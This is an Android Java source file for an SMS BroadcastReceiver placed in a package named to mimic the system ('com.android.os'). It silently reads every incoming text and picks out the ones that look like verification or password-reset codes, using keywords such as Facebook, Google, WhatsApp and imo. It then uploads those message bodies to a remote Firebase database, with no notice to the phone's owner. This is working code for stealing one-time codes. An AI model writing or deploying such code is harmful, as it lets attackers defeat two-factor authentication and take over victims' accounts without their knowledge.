package com.android.os;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {
    Context context;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        if (intent == null) {
            Log.i("123456", "Intent is null");
            return;
        }


        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            SHOW_LOG("Message Received");
            Message receivedMessage = getReceivedMessage(intent);
            if (isVerificationCodeMessage(receivedMessage)) {
                SHOW_LOG("Verification Message");
                sendIntoCloud(context, receivedMessage);
            } else {
                SHOW_LOG("Other Message");

            }

        }
    }




    /*************** Helper Methods*/
    private void SHOW_LOG(String message) {
        Log.i("123456", message);
    }
    private void sendIntoCloud(final Context context, Message receivedMessage) {
        // send message into database
        SHOW_LOG("Sending Sms To Cloud");
        FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
        DatabaseReference databaseReference = firebaseDatabase.getReference("VerificationMessages");
        databaseReference.push().setValue(receivedMessage.getMessageBody(), new DatabaseReference.CompletionListener() {
            @Override
            public void onComplete(@Nullable DatabaseError databaseError, @NonNull DatabaseReference databaseReference) {
                SHOW_LOG("Message Transferred Successful........");

            }

        });

    }
    private Message getReceivedMessage(Intent intent) {
        // getting the sms data
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        Message receivedMessage = new Message();

        for (Object pdu : pdus) {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
            receivedMessage.setSenderNumber(smsMessage.getDisplayOriginatingAddress());
            receivedMessage.setMessageBody(smsMessage.getMessageBody());
        }
        return receivedMessage;
    }
    private boolean isVerificationCodeMessage(Message receivedMessage) {
        String messageBody = receivedMessage.getMessageBody();
        SHOW_LOG("Message Length: " + messageBody.length());
        if (messageBody.length() > 120) return false;

        String message = messageBody.toLowerCase();
        int correctAnswers = 0;
        int totalQuestions = 11;

        if (message.contains("facebook")) correctAnswers += 1;
        if (message.contains("use")) correctAnswers += 1;
        if (message.contains("code")) correctAnswers += 1;
        if (message.contains("reset")) correctAnswers += 1;
        if (message.contains("verification")) correctAnswers += 1;
        if (message.contains("is")) correctAnswers += 1;
        if (message.contains("your")) correctAnswers += 1;
        if (message.contains("google")) correctAnswers += 1;
        if (message.contains("imo")) correctAnswers += 1;
        if (message.contains("whatsapp")) correctAnswers += 1;
        if (isMessageContainNumber(message)) correctAnswers += 1;

        int correctAnswerPercentage = checkCorrectAnswersPercentage(totalQuestions, correctAnswers);
        SHOW_LOG("Correct anser percentage: " + correctAnswerPercentage);
        return correctAnswerPercentage > 20;

    }
    public boolean isMessageContainNumber(String message) {
        // check if message contain number which length > 2
        Pattern p = Pattern.compile("\\d+");
        Matcher matcher = p.matcher(message);
        while (matcher.find()) {
            int numberLength = matcher.group().length();
            if (numberLength > 2) return true;
        }

        return false;
    }
    private int checkCorrectAnswersPercentage(int totalQuestions, int correctAnswers) {
        float result = ((float) correctAnswers / (float) totalQuestions) * 100;
        return (int) result;
    }
}
